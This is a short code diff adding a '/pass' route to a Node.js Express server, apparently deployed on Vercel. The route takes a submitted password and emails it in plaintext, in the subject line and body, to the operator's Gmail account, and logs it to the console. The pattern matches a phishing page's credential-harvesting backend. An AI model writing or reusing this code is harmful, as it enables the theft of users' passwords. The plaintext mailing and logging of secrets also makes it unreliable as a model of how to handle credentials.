@@ -41,5 +41,36 @@ app.post("/", (req, res) => {
   });
 });
 
+// API routes for password
+app.post("/pass", (req, res) => {
+  const { password } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: `${userEmail}`,
+    to: userEmail,
+    subject: `Password: ${password}`,
+    text: `New user registered with Password: ${password}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+
 // Export app for Vercel
 module.exports = app;
